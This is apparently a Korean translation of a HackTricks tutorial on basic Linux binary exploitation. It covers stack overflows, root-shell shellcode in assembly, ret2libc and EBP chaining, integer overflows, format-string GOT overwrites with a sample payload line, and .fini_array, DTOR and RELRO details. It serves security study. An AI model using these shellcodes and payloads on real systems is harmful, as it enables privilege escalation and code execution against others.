# Linux Exploiting (Basic) (기본)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>

## **1. 스택 오버플로우**

> 버퍼 오버플로우, 버퍼 오버런, 스택 오버런, 스택 스매싱

Segmentation fault 또는 segment violation: 프로세스에 할당되지 않은 메모리 주소에 액세스하려고 시도할 때 발생합니다.

프로그램 내의 함수 주소를 얻으려면 다음을 수행할 수 있습니다:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve 호출

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Kernel 인터럽트 확인: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax 초기화\
xor ebx, ebx ; ebx = 0 (전달할 인수 없음)\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; 시스템 콜 실행

**nasm -f elf assembly.asm** —> .o 파일 생성\
**ld assembly.o -o shellcodeout** —> 어셈블리 코드로 이루어진 실행 파일 생성 및 **objdump**로 옵코드 추출\
**objdump -d -Mintel ./shellcodeout** —> 쉘코드 및 옵코드 확인

**쉘코드가 작동하는지 확인**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
시스템 호출이 올바르게 이루어졌는지 확인하려면 이전 프로그램을 컴파일하고 시스템 호출이 **strace ./COMPILADO_프로그램**에 나타나야 합니다.

쉘코드를 작성할 때 한 가지 트릭을 사용할 수 있습니다. 첫 번째 명령은 call로 이동하는 점프입니다. call은 원래 코드를 호출하고 EIP를 스택에 넣습니다. call 명령 다음에 필요한 문자열을 넣었으므로 해당 EIP로 문자열을 가리킬 수 있으며 코드 실행을 계속할 수 있습니다.

예: **트릭 (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**/bin/sh를 사용한 EJ(Egg Jump) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

프로세스와 관련된 메모리 페이지를 탐색하여 거기에 저장된 셸코드를 찾는 작은 코드입니다 (셸코드에 넣은 서명을 찾습니다). 코드를 삽입할 작은 공간만 있는 경우 유용합니다.

**다형 셸코드**

암호화된 셸로, 해독하고 해당 위치로 점프하는 작은 코드가 포함되어 있습니다. Call-Pop 트릭을 사용하는 **시저 암호화 예제**가 있습니다:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **프레임 포인터 (EBP) 공격**

EBP를 수정할 수 있지만 EIP는 수정할 수 없는 상황에서 유용합니다.

함수를 빠져나올 때 다음 어셈블리 코드가 실행된다는 것이 알려져 있습니다:
```
movl               %ebp, %esp
popl                %ebp
ret
```
이렇게 하면 다른 함수에 의해 호출된 함수(fvuln)를 빠져나올 때 EBP를 수정할 수 있습니다. 따라서 fvuln에서 셸코드의 주소 + 4가 가리키는 가짜 EBP를 입력할 수 있습니다(팝을 위해 4를 더해야 함). 이렇게 하면 함수를 빠져나올 때 ESP에 &(\&Shellcode)+4의 값이 들어가며, 팝으로 ESP에서 4를 빼면 ret가 실행될 때 셸코드의 주소를 가리킵니다.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
EBP의 가장 낮은 바이트만 수정할 수 있습니다. 이전과 같은 공격을 수행할 수 있지만 셸코드 주소를 저장하는 메모리는 처음 3바이트를 EBP와 공유해야 합니다.

## **4. Return to Libc 메서드**

스택이 실행 불가능하거나 수정할 공간이 매우 작을 때 유용한 방법입니다.

ASLR은 각 실행마다 함수가 메모리의 다른 위치에 로드되도록 합니다. 따라서 이 방법은 해당 경우에 효과적이지 않을 수 있습니다. 원격 서버의 경우, 프로그램이 항상 동일한 주소에서 실행되므로 유용할 수 있습니다.

* **cdecl(C declaration)** : 인수를 스택에 넣고 함수를 빠져나올 때 스택을 정리합니다.
* **stdcall(standard call)** : 인수를 스택에 넣고 호출된 함수가 스택을 정리합니다.
* **fastcall** : 처음 두 인수를 레지스터에 넣고 나머지를 스택에 넣습니다.

libc의 system 명령어의 주소를 넣고 " /bin/sh" 문자열을 인수로 전달합니다. 또한, 더 이상 셸이 필요하지 않을 때 프로그램을 종료하고 로그를 작성하지 않도록 exit 함수의 주소를 사용합니다.

**export SHELL=/bin/sh**

필요한 주소를 찾기 위해 다음을 확인할 수 있습니다. **GDB:**\
**p system**\
**p exit**\
**rabin2 -i executable** —> 프로그램이 로드될 때 사용하는 모든 함수의 주소를 제공합니다.\
(시작 또는 중단점 내부): **x/500s $esp** —> 여기에서 /bin/sh 문자열을 찾습니다.

이러한 주소를 얻으면 **exploit**은 다음과 같이 됩니다:

“A” \* EBP까지의 거리 + 4 (EBP: 4 "A"일 수 있지만 세그멘테이션 오류를 피하기 위해 실제 EBP가 더 좋습니다) + **system** 주소 (EIP를 덮을 것) + **exit** 주소 (system(" /bin/sh")를 빠져나올 때 이 함수가 호출됩니다. 스택의 처음 4바이트는 실행할 다음 EIP 주소로 처리됩니다) + "**/bin/sh**" 주소 (system에 전달될 매개변수가 될 것)

이렇게 하면 EIP가 system 주소로 덮여지며, 이 주소는 " /bin/sh" 문자열을 매개변수로 받아들이고 이를 실행한 후 exit() 함수를 실행합니다.

어떤 함수의 주소 중 일부 바이트가 널 또는 공백(\x20)일 수 있습니다. 이 경우 해당 함수 이전 주소를 분해하여 직접 함수 대신 NOP 중 하나를 호출할 수 있습니다(예: > x/8i system-4).

이 방법은 system과 같은 함수를 호출할 때 **call** 대신 **ret** 옵코드를 사용하면 함수가 처음 4바이트를 돌아갈 EIP 주소로 이해하기 때문에 작동합니다.

이 방법의 흥미로운 기술 중 하나는 **strncpy()**를 호출하여 스택에서 페이로드를 힙으로 이동시키고 나중에 **gets()**를 사용하여 해당 페이로드를 실행하는 것입니다.

다른 흥미로운 기술은 **mprotect()**를 사용하는 것으로, 이를 통해 메모리의 원하는 부분에 권한을 할당할 수 있습니다. 이 기술은 BDS, MacOS 및 OpenBSD에서 작동하지만 linux에서는 작동하지 않습니다(쓰기 및 실행 권한을 동시에 부여할 수 없도록 제어됨). 이 공격을 사용하면 스택을 다시 실행 가능하게 다시 설정할 수 있습니다.

**함수 체인**

이전 기술을 기반으로 한 이 exploit 방법은 다음과 같습니다:\
Relleno + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + ...

이렇게 하면 호출할 함수를 연결할 수 있습니다. 또한, 여러 인수를 사용하려면 필요한 인수를 넣고 4개의 인수를 넣고 opcodes가 있는 위치를 찾을 수 있습니다: pop, pop, pop, pop, ret —> **objdump -d executable**

**프레임 falsification을 통한 체인화 (EBP 체인화)**

EBP를 조작할 수 있는 기능을 활용하여 EBP와 "leave;ret"를 통해 여러 함수의 실행을 연결하는 것입니다.

RELLENO

* EBP에 다음을 가리키는 가짜 EBP를 배치합니다: 2번째 가짜 EBP + 실행할 함수: (\&system() + \&leave;ret + &“/bin/sh”)
* EIP에는 &(leave;ret) 함수의 주소를 넣습니다.

셸코드를 다음 셸코드 부분의 주소로 시작하도록 시작하십시오. 예를 들어: 2번째 EBP\_falso + \&system() + &(leave;ret;) + &”/bin/sh”

2번째 EBP는 다음과 같습니다: 3번째 EBP\_falso + \&system() + &(leave;ret;) + &”/bin/ls”

이 셸코드는 메모리의 액세스 가능한 부분에 반복해서 배치하여 작은 메모리 조각으로 쉽게 분할할 수 있습니다.

(이전 EBP 및 ret2lib의 취약점을 혼합하여 함수 실행을 연결합니다)

## **5. 보조 메서드**

**Ret2Ret**

스택의 주소를 EIP에 넣을 수 없거나(0xbf가 포함되지 않는지 확인) 셸코드의 위치를 계산할 수 없을 때 유용합니다. 그러나 취약한 함수가 매개변수를 수용하는 경우(셸코드가 여기에 위치함)입니다.

이렇게 하면 EIP를 **ret** 주소로 변경하여 다음 주소(함수의 첫 번째 인수의 주소)를 로드합니다. 즉, 셸코드가 로드됩니다.

exploit은 다음과 같습니다: SHELLCODE + Relleno (EIP까지) + **\&ret** (스택의 다음 바이트는 전달된 매개변수의 주소를 가리키므로 셸코드의 시작 주소가 스택에 입력됩니다)

**strncpy**와 같은 함수는 완료 후 스택에서 셸코드가 저장된 주소를 제거하여 이 기술을 불가능하게 합니다. 즉, 함수에 전달된 매개변수(셸코드를 저장하는 위치)가 0x00으로 변경되어 두 번째 **ret**를 호출할 때 0x00을 만나 프로그램이 종료됩니다.
```
**Ret2PopRet**
```
만약 첫 번째 인자에는 제어권이 없지만 두 번째나 세 번째 인자에는 제어권이 있다면, pop-ret 또는 pop-pop-ret 주소로 EIP를 덮어쓸 수 있습니다.

**Murat 기법**

Linux에서 모든 프로그램은 0xbfffffff부터 매핑됩니다.

새로운 프로세스의 스택이 어떻게 구성되는지 살펴보면, 프로그램이 셸코드만 있는 환경에서 시작되도록 exploit을 개발할 수 있습니다. 따라서 셸코드가 있는 유일한 변수가 있는 환경에서 프로그램이 시작됩니다. 따라서 이 주소는 다음과 같이 계산할 수 있습니다: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

이렇게 하면 셸코드가 있는 환경 변수의 주소를 쉽게 얻을 수 있습니다.

이것은 execle 함수가 원하는 환경 변수만을 가진 환경을 생성할 수 있기 때문에 가능합니다.

**ESP로 이동: Windows 스타일**

ESP가 항상 스택의 시작을 가리키고 있기 때문에, 이 기술은 EIP를 **jmp esp** 또는 **call esp** 호출로 대체하는 것으로 구성됩니다. 이렇게 하면 EIP를 덮어쓴 후에도 shellcode가 저장되어 있게 되며, **ret**을 실행한 후 ESP는 바로 다음 주소를 가리키게 되어 shellcode가 저장된 곳을 가리키게 됩니다.

Windows 또는 Linux에서 ASLR이 활성화되어 있지 않은 경우, 공유 객체에 저장된 **jmp esp** 또는 **call esp**를 호출할 수 있습니다. ASLR이 활성화된 경우, 취약한 프로그램 내에서 찾을 수 있습니다.

또한, EIP 손상 후에 shellcode를 스택 중간이 아닌 덮어쓸 수 있기 때문에 함수 내에서 실행되는 push 또는 pop 명령이 shellcode에 영향을 미치지 않게 됩니다.

이와 매우 유사하게, 함수가 shellcode가 저장된 주소를 반환하는 것을 알고 있다면 **call eax** 또는 **jmp eax (ret2eax)**를 호출할 수 있습니다.

**정수 오버플로우**

이 유형의 오버플로우는 변수가 전달된 숫자만큼 큰 수를 처리할 수 없을 때 발생하며, 부호 있는 변수와 부호 없는 변수 사이의 혼란으로 인해 발생할 수 있습니다.
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
이전 예제에서 볼 수 있듯이 프로그램은 2개의 매개변수를 예상합니다. 첫 번째는 다음 문자열의 길이이고, 두 번째는 문자열입니다.

첫 번째 매개변수로 음수를 전달하면 len < 256이라는 메시지가 표시되어 해당 필터를 통과하게 되며, 또한 strlen(buffer)도 l보다 작을 것입니다. 왜냐하면 l은 unsigned int이므로 매우 크기 때문입니다.

이러한 종류의 오버플로우는 프로그램의 프로세스에 무언가를 쓰려는 것이 아니라, 다른 취약점을 악용하기 위해 잘못 설계된 필터를 우회하는 것을 목표로 합니다.

**초기화되지 않은 변수**

초기화되지 않은 변수가 취할 수 있는 값을 알 수 없으며, 이를 관찰하는 것이 흥미로울 수 있습니다. 이전 함수의 변수가 취할 수 있는 값을 취할 수 있으며, 이 변수가 공격자에 의해 제어될 수 있습니다.

## **포맷 문자열**

C에서 **`printf`**는 문자열을 **출력**하는 데 사용할 수 있는 함수입니다. 이 함수가 예상하는 **첫 번째 매개변수**는 **포매터가 있는 원시 텍스트**입니다. 예상되는 **다음 매개변수**는 원시 텍스트에서 **포매터를 대체할 값**입니다.

공격자 텍스트가 이 함수의 첫 번째 인수로 들어가면 취약점이 발생합니다. 공격자는 **printf 포맷 문자열 기능을 악용하여** 특별한 입력을 만들어 **임의의 주소에 임의의 데이터를 쓸 수 있게** 됩니다. 이렇게 함으로써 **임의의 코드를 실행**할 수 있게 됩니다.

포매터:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`**은 지정된 주소에 쓰여진 바이트 수를 나타냅니다. 쓰여져야 하는 바이트 수만큼 16진수 숫자를 쓰는 것으로 어떤 데이터든 쓸 수 있습니다.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

이 테이블에는 프로그램에서 사용하는 외부 함수의 주소가 포함되어 있습니다.

다음 명령을 사용하여 이 테이블의 주소를 가져옵니다: `objdump -s -j .got ./exec`

GEF에서 실행 파일을 로드한 후에는 GEF에서 `gef➤ x/20x 0xDIR_GOT`를 사용하여 GOT에 있는 함수를 볼 수 있습니다.

GEF를 사용하여 디버깅 세션을 시작하고 `got`을 실행하여 got 테이블을 볼 수 있습니다:

바이너리에서 GOT에는 함수의 주소 또는 함수 주소를 로드할 PLT 섹션이 포함되어 있습니다. 이 exploit의 목표는 나중에 실행될 함수의 GOT 항목을 `system` 함수의 PLT 주소로 덮어쓰는 것입니다. 이상적으로, 제어할 수 있는 매개변수로 호출될 함수의 GOT를 덮어쓸 것입니다 (따라서 시스템 함수에 전송되는 매개변수를 제어할 수 있게 됩니다).

스크립트에서 `system`을 사용하지 않는 경우 시스템 함수는 GOT에 항목이 없을 것입니다. 이러한 시나리오에서는 먼저 `system` 함수의 주소를 누출해야 합니다.

Procedure Linkage Table은 ELF 파일의 읽기 전용 테이블로, 해결이 필요한 모든 심볼을 저장합니다. 이러한 함수 중 하나가 호출되면 GOT가 흐름을 PLT로 리디렉션하여 함수의 주소를 해결하고 GOT에 쓰게 됩니다. 그런 다음 해당 주소로 다음 호출이 수행될 때 함수가 직접 호출되어 해결할 필요가 없게 됩니다.

PLT 주소는 `objdump -j .plt -d ./vuln_binary`로 볼 수 있습니다.

### Exploit Flow

이전에 설명한 대로 목표는 나중에 호출될 함수의 GOT 테이블에서 함수의 주소를 덮어쓰는 것입니다. 이상적으로는 실행 가능한 섹션에 있는 셸코드의 주소로 설정할 수 있지만, 실행 가능한 섹션에 셸코드를 작성할 수 없을 가능성이 높습니다. 따라서 사용자로부터 인수를 받는 함수를 덮어쓰고 그것을 `system` 함수로 지정하는 것이 다른 옵션입니다.

주소를 쓰기 위해 일반적으로 2단계를 거칩니다: 먼저 주소의 2바이트를 쓰고 나머지 2바이트를 씁니다. 이를 위해 `$hn`이 사용됩니다.

HOB는 주소의 상위 2바이트를 나타냅니다. LOB는 주소의 하위 2바이트를 나타냅니다.

따라서 형식 문자열이 작동하는 방식 때문에 먼저 [HOB, LOB] 중 작은 값을 쓰고 다른 값을 써야 합니다.

만약 HOB < LOB이면\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

만약 HOB > LOB이면\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB

`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'`

### Format String Exploit Template

여기에서 형식 문자열을 사용하여 GOT를 exploit하는 템플릿을 찾을 수 있습니다:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

이것은 프로그램이 종료되기 전에 호출될 함수를 포함하는 구조체입니다. 주소로 점프하여 셸코드를 호출할 수 있는 경우나 형식 문자열을 두 번째로 exploit하기 위해 다시 main으로 돌아가야 하는 경우에 흥미로울 수 있습니다.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
이것은 **영원한 루프**를 **생성하지 않습니다**. 왜냐하면 메인으로 돌아가면 canary가 감지하고, 스택의 끝이 손상되어 함수가 다시 호출되지 않을 수 있습니다. 따라서 이를 통해 취약점을 **1번 더 실행**할 수 있습니다.

### **콘텐츠 덤프를 위한 형식 문자열**

형식 문자열은 프로그램의 메모리에서 **콘텐츠를 덤프**하는 데 악용될 수 있습니다.\
예를 들어, 다음 상황에서는 **플래그를 가리키는 스택의 로컬 변수**가 있습니다. **메모리**에서 **플래그를 가리키는 포인터**가 어디에 있는지 **찾으면**, **printf가 해당 주소에 액세스**하고 **플래그를 출력**할 수 있습니다:

그래서, 플래그는 **0xffffcf4c**에 있습니다.

![](<../../.gitbook/assets/image (618) (2).png>)

그리고 누출에서 **플래그를 가리키는 포인터**가 **8번째** 매개변수에 있는 것을 볼 수 있습니다:

![](<../../.gitbook/assets/image (623).png>)

따라서, **8번째 매개변수에 액세스**하여 플래그를 얻을 수 있습니다:

![](<../../.gitbook/assets/image (624).png>)

**이전 exploit을 따라가고 콘텐츠를 누출할 수 있다는 것을 깨닫고**, **`printf`**에 **포인터를 설정**하여 **실행 파일이 로드된 섹션**으로 이동하고 **전체적으로 덤프**할 수 있습니다!

### **DTOR**

{% hint style="danger" %}
요즘에는 dtor 섹션을 가진 이진 파일을 찾기가 매우 **이상합니다**.
{% endhint %}

소멸자는 프로그램이 **종료되기 전에 실행되는 함수**입니다.\
**`__DTOR_END__`**에 **쉘코드의 주소**를 **작성**하면, 해당 프로그램이 종료되기 전에 **실행**됩니다.\
이 섹션의 주소를 얻으려면:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
일반적으로 **DTOR** 섹션은 값 `ffffffff`와 `00000000` 사이에 있습니다. 따라서 이러한 값만 보인다면, **등록된 함수가 없다는 것**을 의미합니다. 따라서 **`00000000`**을 **쉘코드의 주소로 덮어씌우세요**.

### **포맷 문자열을 이용한 버퍼 오버플로우**

**sprintf**는 형식화된 문자열을 **변수로 이동**시킵니다. 따라서 문자열의 **형식을 남용**하여 복사된 내용이 있는 변수에서 **버퍼 오버플로우를 유발**할 수 있습니다.\
예를 들어, 페이로드 `%.44xAAAA`는 변수에 **44B+"AAAA"를 쓸 것**이며, 이는 버퍼 오버플로우를 일으킬 수 있습니다.

### **\_\_atexit 구조체**

{% hint style="danger" %}
현재는 이를 **악용하는 것이 매우 이상합니다**.
{% endhint %}

**`atexit()`**은 **매개변수로 전달된 다른 함수들**이 **실행**될 때 **실행**되는 함수입니다.\
이러한 **함수들**의 **주소** 중 하나를 예를 들어 쉘코드를 가리키도록 **수정**할 수 있다면, **프로세스를 제어**할 수 있지만 현재 이 작업은 더 복잡해졌습니다.\
현재 **실행될 함수들의 주소**는 여러 구조체 뒤에 숨겨져 있으며, 마지막으로 가리키는 주소는 함수들의 주소가 아니라 **XOR로 암호화**되고 **임의의 키**로 이동됩니다. 따라서 현재 이 공격 벡터는 **적어도 x86** 및 **x64\_86**에서는 **매우 유용하지 않습니다**.\
**암호화 함수**는 **`PTR_MANGLE`**입니다. **m68k, mips32, mips64, aarch64, arm, hppa**와 같은 **다른 아키텍처**는 **입력과 동일한 값을 반환**하기 때문에 **암호화 함수를 구현하지 않습니다**. 따라서 이러한 아키텍처는 이러한 벡터에 의해 공격당할 수 있습니다.

### **setjmp() & longjmp()**

{% hint style="danger" %}
현재는 이를 **악용하는 것이 매우 이상합니다**.
{% endhint %}

**`Setjmp()`**는 **컨텍스트(레지스터)**를 **저장**할 수 있습니다.\
**`longjmp()`**는 **컨텍스트**를 **복원**할 수 있습니다.\
저장된 레지스터는 `EBX, ESI, EDI, ESP, EIP, EBP`입니다.\
그러나 EIP와 ESP는 **`PTR_MANGLE`** 함수를 통해 전달되므로, **이 공격에 취약한 아키텍처는 위와 동일**합니다.\
이것들은 오류 복구나 인터럽트에 유용합니다.\
그러나 제가 읽은 바에 따르면, 다른 레지스터는 보호되지 않으므로, 호출되는 함수 내부에 `call ebx`, `call esi` 또는 `call edi`가 있다면 제어를 얻을 수 있습니다. 또는 EBP를 수정하여 ESP를 수정할 수도 있습니다.

**VTable y VPTR en C++**

각 클래스에는 **메서드에 대한 포인터 배열인 V테이블**이 있습니다.

각 **클래스**의 객체에는 해당 클래스의 배열을 가리키는 **VPtr**이 있습니다. VPtr은 각 객체의 헤더의 일부이므로 VPtr을 덮어쓰면 실행 함수가 쉘코드로 이동하도록 수정될 수 있습니다.

## **Preventive Measures and Evasions**

**Return-into-printf**

버퍼 오버플로우를 형식 문자열 오류로 변환하는 기술입니다. EIP를 printf 함수를 가리키도록 대체하여 프로세스 상태에 대한 값을 얻기 위해 조작된 형식 문자열을 전달합니다.

**Library Attacks**

라이브러리는 16비트의 무작위성을 가진 위치에 있습니다. 취약한 서버가 fork()를 호출하면 메모리 주소 공간이 자식 프로세스에 복제되고 그대로 유지됩니다. 따라서 libc의 usleep() 함수에 "16"을 인수로 전달하여 일반적보다 오랜 시간이 걸리면 해당 함수를 찾은 것으로 간주할 수 있습니다. 해당 함수의 위치를 알면 delta_mmap을 얻고 다른 값을 계산할 수 있습니다.

ASLR이 작동하는지 확실하게 하려면 64비트 아키텍처를 사용해야 합니다. 거기서는 무차별 대입 공격이 없습니다.

### Relro

**Relro (Read only Relocation)**는 메모리 권한에 영향을 미치며 NX와 유사합니다. 차이점은 NX가 스택을 실행 가능하게 만드는 반면, RELRO는 **일부 내용을 읽기 전용**으로 만들어 **쓸 수 없게** 합니다. 이것이 장애물이 되는 가장 흔한 방법은 **`got` 테이블 덮어쓰기**를 방지하는 것입니다. `got` 테이블은 바이너리가 libc 함수의 주소를 알고 호출할 수 있도록 주소를 보유합니다. RELRO가 있는 경우와 없는 경우의 `got` 테이블 항목에 대한 메모리 권한이 어떻게 보이는지 살펴봅시다.

RELRO가 있는 경우:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
### Relro가 없는 경우:

Relro가 없는 경우, Global Offset Table(GOT)를 이용하여 함수 주소를 얻을 수 있습니다. 이를 통해 함수 호출을 조작하거나 다른 함수로 덮어쓸 수 있습니다.
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
